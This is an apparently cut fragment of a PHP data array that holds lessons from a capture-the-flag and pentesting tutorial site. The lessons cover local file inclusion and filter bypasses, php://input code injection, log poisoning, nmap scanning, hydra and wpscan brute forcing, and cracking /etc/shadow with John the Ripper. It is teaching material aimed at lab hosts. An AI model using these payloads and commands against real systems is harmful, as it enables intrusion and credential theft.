    'category' => 'HTTP',
    'id' => 'HTTPFormPostFile',
    'title' => 'FILE: Upload',
    'desc' => '## FILE: Upload

Forms are often used to register, login, and upload files.<br/>
Lots of sanity checks can be done in JavaScript in the browser before the upload or on the server after the upload.<br/>
Filename and file extension, are often checked, sometime even the file header is chekced to verify wether it\'s an image or a php file.<br/>
A full chapter is dedicated to file upload and filter bypass.<br/>
<br/>
A File field can be identified by the following HTML code
```
&lt;input type=file name=fileToUpload>:
```

Curl command
```
curl -X POST -F \'fileToUpload=@./picture.jpg\' http://10.10.1.11/upload
```


',
  ),
  'HTTP-HTTPFormCookies' => 
  array (
    'category' => 'HTTP',
    'id' => 'HTTPFormCookies',
    'title' => 'Curl: Store and modify cookies',
    'desc' => '## Curl: Store and modify cookies

Cookies are used to store data on the browser, that will be reused at the next session.<br/>
They can contain everything: choices of language, colors, and sometimes password...<br/>
<br/>
Read cookies in the server response and store them in a cookie jar.
```
$ curl  -c cookies.txt http://10.10.1.11/cookies.php
```


Send a stored cookie, and update its value with the response
```
$ curl -b cookies.txt -c cookies.txt http://10.10.1.11/cookies.php
```


Send a manually crafted cookie
```
$ curl -b \'code=1447\' http://10.10.1.11/cookies.php
```



',
  ),
  'lfi-intro' => 
  array (
    'category' => 'lfi',
    'id' => 'intro',
    'title' => 'Local File Inclusion (LFI)',
    'desc' => '## Local File Inclusion (LFI)


',
  ),
  'lfi-LFI' => 
  array (
    'category' => 'lfi',
    'id' => 'LFI',
    'title' => 'LFI',
    'desc' => '## LFI

Many programming languages, such as php, are able to read files and process them to generate dynamic HTML pages.<br/>
This feature can be hijacked by user crafted variable.<br/>
<br/>
For exemple:<br/>
The URI http://10.10.10.11/index.php?page=login.php is sent to the server.
The server receive the request extract the page field \'login.php\' and process this file to generate the HTML login page.

Let replace \'login.php\' by another file such as \'/etc/passwd\', that will be processed by php.
```
http://10.10.10.11/index.php?page=/etc/passwd
```
Php commands are enclosed between &lt;?php and ?> tags. When parsing a file without those tags, php simply print the file content.

',
  ),
  'lfi-FLI..' => 
  array (
    'category' => 'lfi',
    'id' => 'FLI..',
    'title' => 'LFI: Access /',
    'desc' => '## LFI: Access /

Apache web server working directory is usually /var/www/html.<br/>
Setting page=/etc/passwd, the server tries to open the file /var/www/html/etc/passwd. <br/>
Let add /../ to the path to reach the upper directory.<br/>

```
/var/www/html/../etc/passwd => /var/www/etc/passwd.
/var/www/html/../../etc/passwd => /var/etc/passwd.
```

We can add as many  ../../../../../ as we want, we can\'t go upper than /.<br/>
/var/www/html/../../../../../../../ => /, regardless of the number of ../<br/>

```
http://10.10.10.11?page=../../../../../etc/passwd
```

An LFI can read/execute ALL files, the web server account is allowed to read.

',
  ),
  'lfi-LFINull' => 
  array (
    'category' => 'lfi',
    'id' => 'LFINull',
    'title' => 'NUll byte',
    'desc' => '## NUll byte

The server extracts \'page\' parameter from request http://10.10.10.11/index.php?page=login, and appends an extension such as \'.php\' before including it.<br/>
<br/>
http://10.10.10.11/index.php?page=/etc/password tries without succes to open /etc/password.php.<br/>
<br/>
On php version older than 5.3.4, adding a null byte at the end of our parameter will mean the end of the string, and leads to ignoring the extension \'.php\'.<br/>
```
http://10.10.10.11/index.php?page=/etc/password%00
```


',
  ),
  'lfi-LFIURLDoubleEncodage' => 
  array (
    'category' => 'lfi',
    'id' => 'LFIURLDoubleEncodage',
    'title' => 'URL double encoding',
    'desc' => '## URL double encoding

```
<   %3C %253C
>   %3E %253E
«   %22 %2522
‘   %27 %2527
/   %2F %252F
.   %2E %252E
=   %3D %253D
–   %2D %252D
:   %3A %253A
```

',
  ),
  'lfi-LFIWaf' => 
  array (
    'category' => 'lfi',
    'id' => 'LFIWaf',
    'title' => 'WAF: Web Application Filter',
    'desc' => '## WAF: Web Application Filter

Developers, who are aware of the risks of LFI, sometime add functions that will filter the entries.<br/>
They detect and remove the ../ and the / in the filename<br/>.
This kind of filter is called a Waf: Web Application Filter.<br/>
<br/>
It is possible to bypass these filters in several ways:<br/>
- By providing the sequences of characters that will be filtered out: ..././ once filtered becomes ../<br/>
http://10.10.10.11/index.php?page=..././..././..././..././passwd<br/>
<br/>
- Using url encoding:<br/>
%2e%2e%2f instead of ../<br/>
%2f instead of /<br/>
http://10.10.10.11/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd<br/>
<br/>
- Using a double url encoding:<br/>
../ => %2e%2e%2f => %252e%252e%252f<br/>
http://10.10.10.11/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpassword<br/>
<br/>

Browsers could interpret the encoded characters or even re-encode them. It is usually better to set the desired URL thanks to a curl command or modify/replay using an HTTP proxy.

',
  ),
  'lfi-LFIphpfilter' => 
  array (
    'category' => 'lfi',
    'id' => 'LFIphpfilter',
    'title' => 'Php:filter: Get php sources',
    'desc' => '## Php:filter: Get php sources

Php allows to pass files through filters before opening them. It is thus possible to encode a file in base64 before opening it.
````
http://10.10.10.11/index.php?page=php://filter/read=convert.base64-encode/resource=login.php
http://10.10.10.11/index.php?page=php://filter/convert.base64-encode/resource=login.php
````
It only remains to decode base64 to get the source code of the file.

',
  ),
  'lfi-LFIphpinput' => 
  array (
    'category' => 'lfi',
    'id' => 'LFIphpinput',
    'title' => 'Php:input : Code injection in an HTTP Post',
    'desc' => '## Php:input : Code injection in an HTTP Post

Php allows to read the content of the HTTP request as a file. It is thus possible to read and execute the raw content of the data in POST with php://input.<br/>

curl  -X POST -d \'test=&lt;? system (&quot;id&quot;); ?>\' http://pwnlab/?page=php://input<br/>

Only works if the option allow_url_include = On is active in the php config. This option is disabled by default.

',
  ),
  'lfi-FLILog' => 
  array (
    'category' => 'lfi',
    'id' => 'FLILog',
    'title' => 'Logs Exploitation',
    'desc' => '## Logs Exploitation

To inject a Php payload in the log file of a server, just send an HTTP GET request containing php code in the url.<br/>
For an ssh or ftp server, inject the payload in login.
Use then an LFI on the log file to trigger the payload.<br/>
<br/>
Usual log files locations:<br/>
Apache<br/>
/var/log/apache/access.log<br/>
/var/log/apache/error.log<br/>
/usr/local/apache/log/error_log<br/>
/usr/local/apache2/log/error_log<br/>
/var/log/httpd/error_log<br/>
<br/>
Nginx<br/>
/var/log/nginx/access.log<br/>
/var/log/nginx/error.log<br/>
<br/>
Ssh<br/>
/var/log/sshd.log<br/>
<br/>
Log files location can be found in webservers config files:<br/>
Nginx: /etc/nginx/nginx.conf<br/>
Look for : access_log /spool/logs/nginx-access.log<br/>


',
  ),
  'Network-intro' => 
  array (
    'category' => 'Network',
    'id' => 'intro',
    'title' => 'Network',
    'desc' => '## Network

You just connected to a new network.

Get the IP address the router just gave you.
Scan the network to identify all active hosts IPs.
Then scan each host to list open ports and determine which services are running on it.
When possible read services banners and identify the version number of the services.
Look for possible known exploits for service/version pairs.

',
  ),
  'Network-ip' => 
  array (
    'category' => 'Network',
    'id' => 'ip',
    'title' => 'IP : Internet Protocol',
    'desc' => '## IP : Internet Protocol

An IP address (with IP for Internet Protocol) is an identifier, which is assigned, permanently or temporarily, to each machine connected to a computer network (PC, telephone, smart TV, connected object, ...).

IPv4 (version 4) addresses are 32-bit coded. They are generally represented in decimal notation with four numbers between 0 and 255, separated by dots.
Example: 172.16.254.1

A server has as many addresses as there are network cards. Some addresses have a reserved use:
- 127.0.0.1, called <i>loopback</i> designates our server.
- 0.0.0.0.0, designates all the IP addresses of our server.

<br/>
_Subnetwork_

The first bits of the IP address specify the network number, the next bits the host number.
The number of bits in the network is specified by the network mask:
- 10.10.10.12/16 => Network 10.10.x.x, there are 65535 addressable machines on this network.
- 10.10.10.12/24 => Network 10.10.10.x, there are 128 addressable machines on this network.

When we scan 10.10.10.1/24, we test all addresses from 10.10.10.1 to 10.10.10.255.

<br/>
_192.168.X.X/16, 172.16.0.0/12 and 10.X.X.X/8_

The 192.168.X.X/16, 172.16.0.0/12 and 10.X.X.X/8 networks are dedicated to local networks.
Such adresses should never be forwarded by routers or boxes to Internet.
You must train scans and exploits ONLY on hosts on those networks.

<a href=\'https://en.wikipedia.org/wiki/IP_address\'>Wikipedia: https://en.wikipedia.org/wiki/IP_address</a>

',
  ),
  'Network-NetIpAddr' => 
  array (
    'category' => 'Network',
    'id' => 'NetIpAddr',
    'title' => 'Know your IP adress thanks to \'ip addr\'',
    'desc' => '## Know your IP adress thanks to \'ip addr\'

```

$ ip addr

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
inet 127.0.0.1/8 scope host lo
valid_lft forever preferred_lft forever
73: eth1@if74: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
link/ether 02:42:0a:0a:0a:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
inet <span  style=\'color:Cyan;\'>10.10.10.3/24</span > brd 10.10.10.255 scope global eth1
valid_lft forever preferred_lft forever
```


',
  ),
  'Network-NetIfconfig' => 
  array (
    'category' => 'Network',
    'id' => 'NetIfconfig',
    'title' => 'Know your IP adress thanks to \'ifconfig\'',
    'desc' => '## Know your IP adress thanks to \'ifconfig\'

```

$ ifconfig

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet 10.10.0.2  netmask 255.255.255.0  broadcast 10.10.0.255
ether 02:42:0a:0a:00:02  txqueuelen 0  (Ethernet)
RX packets 7567  bytes 573298 (559.8 KiB)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 7073  bytes 4046236 (3.8 MiB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet <span style=\'color:Cyan;\'>10.10.10.3</span>  netmask <span style=\'color:Cyan;\'>255.255.255.0</span>  broadcast 10.10.10.255
ether 02:42:0a:0a:0a:03  txqueuelen 0  (Ethernet)
RX packets 15569  bytes 2618290 (2.4 MiB)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 20985  bytes 1976399 (1.8 MiB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```



',
  ),
  'NetworkDiscovery-intro' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => 'intro',
    'title' => 'Network Discovery',
    'desc' => '## Network Discovery


',
  ),
  'NetworkDiscovery-dicoverhost' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => 'dicoverhost',
    'title' => 'Discover Hosts',
    'desc' => '## Discover Hosts

Use nmap to identify live hosts on 10.10.10.4/24 network
```
# nmap 10.10.10.4/24
# nmap 10.10.10.1-255
```


',
  ),
  'NetworkDiscovery-portscanner' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => 'portscanner',
    'title' => 'Port scanner',
    'desc' => '## Port scanner

```
# nmap 10.10.10.4
# nmap -A  10.10.10.4          : Scan Top 1000 ports et get services versions
# nmap -sV -sC -p- 10.10.10.4  : Scan all 65535 TCP ports
# nmap -sU 10.10.10.4          : Scan UDP ports
-sV : Attempts to determine the version of the service running on port
-sC : Scan with default NSE scripts. Considered useful for discovery and safe
-A  : Enables OS detection, version detection, script scanning, and traceroute
-p- : Port scan all ports
-sU : UDP ports (very slow)
-oN nmap.log : output file
```

The three scripts can be launch in parallel in three different xterms.

',
  ),
  'NetworkDiscovery-portidentification' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => 'portidentification',
    'title' => 'Ports identification',
    'desc' => '## Ports identification

Despite they can run on any port, services such as ftp, web, or ldap generally use the ports reserved for them.
Port 80 for example is used by web servers for HTTP.
Port 443 is the port for HTTPS.
```
TCP
20: ftp data
21: ftp control
22: ssh
23: telnet
25: SMTP (mail)
37: Time protocol
53: Bind/DNS
69: TFTP (Trivial FTP)
80: HTTP
109: POP2
110: POP3
111: RPC Remote Procedure Call
137: Netbios Name Service
138: Netbios Datagram Service
139: Netbios Session Service
143: IMAP (mail)
161: SNMP
220: IMAP
389: LDAP
443: HTTPS
445: MS Active Directory, SMB
464: Kerberos
1521: Oracle Database
3000: Node JS
3306: MySQL
UDP
69: TFTP
161: SNMP

http://www.0daysecurity.com/penetration-testing/enumeration.html
```


',
  ),
  'NetworkDiscovery-21FtpAnonymous' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => '21FtpAnonymous',
    'title' => '21: FTP - Anonymous',
    'desc' => '## 21: FTP - Anonymous

Ftp servers are used to transfer files.
Once logged in with a login/password, it is possible to move through the directory tree to upload/download files.
By default, the protocol is optimised for text files. Do not forget to activate the binary mode if necessary.
A guest or anonymous account allows on certain servers to freely download public documents.
The login is \'anonymous\', the password is conventionally the guest\'s email.
```
$ ftp 10.0.0.11
Name (10.0.0.11:yolo): anonymous
Password: yolo@yolospacehacker.com
ftp> pwd
ftp> cd docs
ftp> ls
ftp> bin
ftp> get flag.txt
ftp> put backdoor.php
ftp> bye
```


',
  ),
  'NetworkDiscovery-22Ssh' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => '22Ssh',
    'title' => '22: Ssh',
    'desc' => '## 22: Ssh

22 is the ssh port, which allows remote access to a terminal.
It is possible to connect with a login/password.
```
$ ssh yolo@10.0.0.11
```


It is also possible to log in with a private key file.
```
$ ssh -i id_rsa yolo@10.0.0.11
```

The private key file should only be read by its owner.
```
$ chmod 600 id_rsa
```


',
  ),
  'NetworkDiscovery-80HTTProbots' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => '80HTTProbots',
    'title' => '80: HTTP - Robots.txt',
    'desc' => '## 80: HTTP - Robots.txt

The robots.txt file, when it exists, is stored at the root of a website.
It contains a list of the resources of the site that are not supposed to be indexed by search engine spiders.<br/>
By convention, robots read robots.txt before indexing a website.<br/>
Its content may therefore be of interest to us.```
http://10.10.10.8/robots.txt
```

Plus d\'info : <a href=\'https://en.wikipedia.org/wiki/Robots_exclusion_standard\'>https://en.wikipedia.org/wiki/Robots_exclusion_standard</a>

',
  ),
  'NetworkDiscovery-80HTTPsrc' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => '80HTTPsrc',
    'title' => '80: HTTP - Page source',
    'desc' => '## 80: HTTP - Page source

Developers sometimes leave useful information or even passwords in code comments. These are often urls, or form fields used for testing.<br/><br/>
<div>Comments in the HTML or JS source code of the pagee</div>
```
/* Secret code */
&lt;!--- Secret code ---&gt;
```


<div>Hidden HTML elements</div>
```
&lt;p hidden&gt;Secret code.&lt;/p&gt;
&lt;label style=&apos;display: none&apos;&gt;Secret code.&lt;/label&gt;
```


',
  ),
  'NetworkDiscovery-80HTTPdirs' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => '80HTTPdirs',
    'title' => '80: HTTP - Directory and files bruteforce',
    'desc' => '## 80: HTTP - Directory and files bruteforce

Bruteforcing a website consists in testing the presence of accessible pages, such as /register, /register.php, /admin, /upload, /users/login.txt, /admin/password.sav, ...
For this there are lists of directories and filenames frequently found on web servers.<br/>
<br/>
Once web server langage/framework is known (php, java, cgi / wordpress, joomla, ...), it is possible to use optimized lists, and search only the appropriate extensions.: php, php4, php5, exe, jsp, ...<br/>
It is also possible to search for files with interesting extensions. : cfg, txt, sav, jar, zip, sh, ...

<br/>
Usual web brute force software :
<ul>
<li>dirb: Command line. To be used for a quick check, with its list \'common.txt\'.</li>
<li>gobuster: Command line. To be used with the list \'directory-list-2.3-medium.txt\' from dirbuster</li>
<li>dirbuster: GUI. With a Gui, but not the best choice.</li>
</ul>

It is crucial to choose the right list of directories/filenames:
<ul>
<li>/usr/share/wordlists/dirb/common.txt: Small well-constructed list</li>
<li>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt: Big list. Should covers all CTFs.</li>
<li>https://github.com/danielmiessler/SecLists : Once comfortable with the two previous lists, it is possible to find more optimized lists at this address.
<li>On Kali and Parrot distributions, the /usr/share/wordlists directory contains links to many lists. Take the time to look at it in detail.</li>
</ul>
<br/>

<h5>Dirb</h5>
Dirb is usually preinstalled on Kali or Parrot. If not:
```
sudo apt-get install -y dirb
```

Run a quick scan with dirb, whith its default \'common.txt\' list:
```
dirb http://10.10.10.11
```


Find files with .php file extension:
```
dirb http://10.10.10.11  -X .php
```

<br/>

<h5>Gobuster</h5>
```
https://github.com/OJ/gobuster
```

Download and install in /opt
```
wget https://github.com/OJ/gobuster/releases/download/v3.0.1/gobuster-linux-amd64.7z
sudo apt install p7zip-full
7z x gobuster-linux-amd64.7z
sudo cp gobuster-linux-amd64/gobuster /opt/gobuster
chmod a+x /opt/gobuster
```


Bruteforce http://10.10.10.11, with the list \'directory-list-2.3-medium.txt\', and file extensions html,php,txt:
```
/opt/gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.11  -l -x html,php,txt
```


For an HTTPS url, add the command line option
```
-k : skip HTTPS ssl verification
```


',
  ),
  'NetworkDiscovery-80HTTPbrutebasicauth' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => '80HTTPbrutebasicauth',
    'title' => '80: HTTP - Basic Auth - Brute force',
    'desc' => '## 80: HTTP - Basic Auth - Brute force

<h5>Hydra</h5>
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt  -f 10.10.10.157 http-get /monitoring
```

```
-l login
-P password file
-f server adress
http-get : HTTP request type
/monitoring : url path
```


',
  ),
  'NetworkDiscovery-80HTTPbruteformpost' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => '80HTTPbruteformpost',
    'title' => '80: HTTP - HTML Form POST - Authentication brute force',
    'desc' => '## 80: HTTP - HTML Form POST - Authentication brute force

<h5>Hydra</h5>
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.11 http-post-form \'/admin/login.php:username=^USER^&password=^PASS^:F=Wrong password:H=Cookie\\: PHPSESSIONID=ms0t93n23mc2bn2512ncv1ods4\' -V
```

Beware if the answer is a 302 Redirect, hydra will not follow and will generate a false positive.
',
  ),
  'NetworkDiscovery-80HTTPbruteformget' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => '80HTTPbruteformget',
    'title' => '80: HTTP - Form HTTP GET - Brute force',
    'desc' => '## 80: HTTP - Form HTTP GET - Brute force

<h5>Hydra</h5>
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.4 http-get-form \'/login.php:username=^USER^&password=^PASS^:F=Login failed:H=Cookie\\: PHPSESSIONID=ms0t93n23mc2bn2512ncv1ods4\' -V
```

Beware if the answer is a 302 Redirect, hydra will not follow and will generate a false positive.
',
  ),
  'NetworkDiscovery-wordpress' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => 'wordpress',
    'title' => 'CMS: Wordpress',
    'desc' => '## CMS: Wordpress

<h5>Wordpress</h5>

URLs format:
```
Posts : /index.php?p=22
/index.php/2017/04/12/hello-world/
/index.php/jobs/apply/8/
Login : /wp-login/
/wp-login.php
Uploaded files : /wp-content/uploads/%year%/%month%/%filename%
```


Config file and database credentials
```
/var/www/html/
wordpress/wp-config.php
wordpress/htdocs/wp-config.php
```


<h5>Wpscan</h5>
Wpscan knows the structure of a wordpress site and will make brute force to identify the pages, the posts, the users, the theme, the plugins.<br/>
Wordpress flaws are mainly due to non-updated plugins.
```
wpscan --url http://10.10.10.10/wordpress/ -e
--url : wordpress url
-e : enum pages, posts, users, theme, plugins, ...
```

Login bruteforce
```
wpscan --url http://10.10.10.10/wordpress/  -P rockyou.txt -U admin
```


',
  ),
  'NetworkDiscovery-110POP3' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => '110POP3',
    'title' => '110: POP3',
    'desc' => '## 110: POP3

POP3 protocol is used to get your mails from a distant server.
If you have the login/password, connect thanks to netcat or telnet
```
$ nc 10.0.12.10 110
```

Once connected, authenticate with login/password
```
USER XXXXXX
PASS XXXXXX
```

Get the mails list
```
LIST
```

Read mail number 1
```
RETR 1
```

Quit the server.
```
QUIT
```


',
  ),
  'NetworkDiscovery-110POP3BF' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => '110POP3BF',
    'title' => '110: POP3 Bruteforce',
    'desc' => '## 110: POP3 Bruteforce

Use hydra to bruteforce POP3 authent.
```
hydra -V -l username -P wordlist.txt 10.0.12.10 pop3
```


',
  ),
  'NetworkDiscovery-3306MySQL' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => '3306MySQL',
    'title' => '3306: MySQL',
    'desc' => '## 3306: MySQL

You have found database credentials in config file. Let use mysql client to connect and dump the database.
```
mysql --host=HOST -u USER -p
--host xx : Server IP or name
-u xx     : login
-p        : manually enter the password.
```

List databases.<br/>
```
show databases;
```

Ignore internal databases and choose the application database.<br/>
The database \'information_schema\' contains internal information of mysql or mariadb. It can generally be ignored.<br/>
Select the aplication database, list tables, then dump interresting tables such as \'users\'.
```
use DATABASE;
show tables;
SELECT * FROM TABLENAME;
quit;
```


',
  ),
  'NetworkDiscovery-PORTKNOCK' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => 'PORTKNOCK',
    'title' => 'Port knocking',
    'desc' => '## Port knocking

Pour rendre certains services invisibles aux scans, les serveurs peuvent utiliser une fonctionnalité de Port Knocking.
Les ports sensibles ne sont ouverts qu\'une fois une séquence particulière de paquets reçus, idéalement en UDP.
Cette fonctionnalité peut être implémentée directement dans le routeur, le firewall ou l\'application.

Envoyer un unique paquet vide en UDP sur le port 1337
```
nc -u -z localhost 1337
```

Envoyer une série de paquets vides sur les port UDP 1337 4444 6666
```
nc -u -z localhost 1337 4444 6666
```

Envoyer un unique paquet contenant le message KnockKnockKnock sur le port UDP 1337
```
printf KnockKnockKnock | nc -u -q1 localhost 1337
```

Envoyer une série de paquets contenant le message KnockKnockKnock sur les port UDP 1337 4444 6666
```
for i in 1337 4444 6666; do printf Knock | nc -u -q1 localhost $i; done
```



',
  ),
  'Password-intro' => 
  array (
    'category' => 'Password',
    'id' => 'intro',
    'title' => 'Passwords',
    'desc' => '## Passwords

Brute force tools and password lists.

',
  ),
  'Password-password' => 
  array (
    'category' => 'Password',
    'id' => 'password',
    'title' => 'Guess the password',
    'desc' => '## Guess the password

When it comes to choosing a password, it always comes at the worst possible time.<br/>
And since, moreover, it is necessary to remember it... passwords are often based on simple notions: first name, brand, memory...<br/>
<br/>
Fortunately, security managers impose password management policies designed to prevent these abuses... <br/>
Well, ...<br/>
In 90% of the cases, the capital letter is at the beginning of the password, the numbers and the special character at the end...<br/>
Please stop using Ferrari12$ as password...

',
  ),
  'Password-rockyou' => 
  array (
    'category' => 'Password',
    'id' => 'rockyou',
    'title' => 'Password list : Rockyou.txt',
    'desc' => '## Password list : Rockyou.txt

RockYou, a California based company, made it possible to authenticate on facebook applications without having to re-enter passwords. In December 2009, it was hacked. <br/>
<br/>
The database containing the unencrypted names and passwords of its 32 million customers was stolen and then made public.<br/>
An analysis of the passwords showed that two thirds of the passwords were less than 6 characters long, and that the most commonly used password was 123456.<br/>
<br/>
This list of passwords, sorted by frequency is frequently used in CTF.<br/>
On Kali, the file, zipped, is stored in: /usr/share/wordlists/rockyou.zip<br/>
In the terminal, to get into good habits, the file can be found at: /usr/share/wordlists/rockyou.txt<br/>
<br/>
<a href=\'rockyou.txt\'>password list Rockyou: rockyou.txt</a>

',
  ),
  'Password-fuite' => 
  array (
    'category' => 'Password',
    'id' => 'fuite',
    'title' => 'Firefox Monitor',
    'desc' => '## Firefox Monitor

To find out if your email address is present in a data leak, use the Firefox Monitor service.<br/>
https://monitor.firefox.com/

',
  ),
  'Password-hash' => 
  array (
    'category' => 'Password',
    'id' => 'hash',
    'title' => 'Hash',
    'desc' => '## Hash

A professional never keeps a password. <br/>
It records a hash.<br/>
<br/>
A hash is generated by a mathematical function from the user\'s password. <br/>
When the user enters his password, the software calculates the hash and sends it to the server which compares it with the hash it has stored.
If the two hashes match, then the user knows the password, and is authenticated.
If someone sniffs the messages, he won\'t see the password, just the Hash.<br/>
Knowing the Hash, it is complicated to retrieve the password.
<br/>
To calculate a Hash of the password \'123456\' with the MD5 function, use the following command in the terminal :<br/>
$ printf \'123456\' | md5sum<br/>
123456 will always give the same MD5 Hash.<br/>
<br/>
The MD5 function has been widely used in the past, but the power of today\'s processors requires the use of more complex functions to be cracked such as SHA1, SHA256 or SHA512.<br/>.
The size of the hash increases with the complexity of the algorithm.<br/><br/>
printf \'123456\' | sha1sum<br/>
7c4a8d09ca3762af61e59520943dc26494f8941b<br/>
<br/>
printf \'123456\' | sha256sum<br/>
8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92 <br/>
<br/>
Note: we use \'printf\' and not \'echo\' for a hash calculation. Echo adds a line break which is taken into account by the Hash.

',
  ),
  'Password-hashonline' => 
  array (
    'category' => 'Password',
    'id' => 'hashonline',
    'title' => 'Online Hash crack',
    'desc' => '## Online Hash crack

Use online services to crack hash:<br/>
- Crackstation : https://crackstation.net/

Try: e10adc3949ba59abbe56e057f20f883e

',
  ),
  'Password-etcpasswd' => 
  array (
    'category' => 'Password',
    'id' => 'etcpasswd',
    'title' => '/etc/passwd',
    'desc' => '## /etc/passwd

The /etc/passwd file is a text file with each line describing a user account.<br/>
Each line consists of seven fields separated by a colon.<br/>
Here is an example of a recording:<br/>
```
jsmith:x:1001:1000:Joe Smith,Room 1007,(234)555-8910,(234)5550044,email:/home/jsmith:/bin/sh
```

<ul>
<li>jsmith: login name. </li>
<li>x : a x means password hash is stored in the /etc/shadow file, which is only readable by the root account. A * prevents connections from an account while keeping its username. In early versions of unix, this field contained the cryptographic hash of the user\'s password.</li>
<li>1001 : UID - User ID</li>
<li>1000 : GID - Group ID. A number, identifying the user main group. </li>
<li>Joe Smith,Room 1007,(234)555-8910,(234)5550044,email : Gecos field. A comment that describes the person or account. Usually a comma-separated set of values, providing the user\'s full name and contact information.</li>
<li>/home/jsmith : account home directory.</li>
<li>/bin/sh : shell program used by the user. Can be nologin.</li>
</ul>
The first lines of the file are usually system accounts.<br/>
User accounts are often described in the last lines.<br/>
This file allows to quickly identify users, applications (tomcat, mysql, www_data,...), their working directories, and whether or not they have access to a shell.<br/>
<br/>
Wikipedia: https://en.wikipedia.org/wiki/Passwd

',
  ),
  'Password-john' => 
  array (
    'category' => 'Password',
    'id' => 'john',
    'title' => 'Hash crack: John the ripper',
    'desc' => '## Hash crack: John the ripper

John The ripper allows to check if a hash corresponds to a password present in a list.<br/>
<br/>
Save one or more hashes in hash.txt file.
```
$ echo \'root:$1$1337$WmteYFHyEYyx2MDVXln7Y1\' >hash.txt
$ echo \'wordpressuser1:$P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0\' >>hash.txt```


Use John the ripper to break the password using its internal password list:
```
$ john hash.txt```


Use John the ripper to break the password using the Rockyou list:
```
$ john hash.txt --wordlist=/etc/share/wordlists/rockyou.txt```


John no longer displays passwords he has already broken.<br/>
To view these passwords:
```
$ john hash.txt --show ```


There are several versions of John on the Internet.
The Kali and Parrot distributions, install the John Community Enhanced -jumbo version.
This distribution is available at https://github.com/openwall/john
```
$ sudo snap install john-the-ripper
$ john
John the Ripper 1.9.0-jumbo-1 OMP [linux-gnu 64-bit 64 AVX2 AC]```


',
  ),
  'Password-johnshadow' => 
  array (
    'category' => 'Password',
    'id' => 'johnshadow',
    'title' => 'John - /etc/passwd /etc/shadow',
    'desc' => '## John - /etc/passwd /etc/shadow

Bruteforce /etc/shadows with John:<br/>
```
$ unshadow /etc/passwd /etc/shadow > hash.txt
$ john hash.txt --wordlist=/etc/share/wordlists/rockyou.txt
$ john hash.txt --show
```


',
  ),
  'Password-johnmysql' => 
  array (
    'category' => 'Password',
    'id' => 'johnmysql',
    'title' => 'John - MySQL Hash',
    'desc' => '## John - MySQL Hash

Bruteforce MySQL Hash with John:<br/>
```
mysql -u dbuser -p drupaldb
show databases;
show tables;
select name, pass from users;
exit
-------+---------------------------------------------------------+
| name  | pass                                                    |
+-------+---------------------------------------------------------+
|       |                                                         |
| admin | $S$DvQI6Y6xxxxxxxxxxxxxxxxxxxxxxxxxEDTCP9nS5.i38jnEKuDR |
| Fxxxx | $S$DWGrxefxxxxxxxxxxxxxxxxxxxxxxxxxxxx3QBwC0EkvBQ/9TCGg |
| ..... | $S$Drpxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/x/4ukZ.RXi |
+-------+---------------------------------------------------------+

echo \'$S$DWGrxefxxxxxxxxxxxxxxxxxxxxxxxxxxxx3QBwC0EkvBQ/9TCGg\'>hash.txt
$ john hash.txt --wordlist=/etc/share/wordlists/rockyou.txt
$ john hash.txt --show
```


',
  ),
  'Password-johnsshrsa' => 
  array (
    'category' => 'Password',
    'id' => 'johnsshrsa',
    'title' => 'John - Password protected SSH RSA Key',
    'desc' => '## John - Password protected SSH RSA Key

Bruteforce a pasword protected id_rsa id (id used for ssh connections):<br/>
<br/>
RSA header:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25325A9B318F344B8391AFD767D6D

NhAAAAAwEAAQAAAgEA4hHFXkYNJLp47GZdP1LEJ3rueKhu4c9SCqzbeJfaWUJY/nZSmV76
```

Let check if the password is in the Rockyou list.
```

$ python  /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
$ john hash.txt --show
```



',
  ),
  'PrivEscUx-intro' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'intro',
    'title' => 'Privilege Elevation - Unix',
    'desc' => '## Privilege Elevation - Unix

Privilege elevation techniques for Unix.

',
  ),
  'PrivEscUx-privelev' => 
  array (
    'category' => 'PrivEscUx',
    'id' => 'privelev',
    'title' => 'Principle',
    'desc' => '## Principle

You just got shell access to a server.
Let start by an exhaustive inventory of what is accessible to your account.<br/>
- Identify the OS, its version, the missing security patches
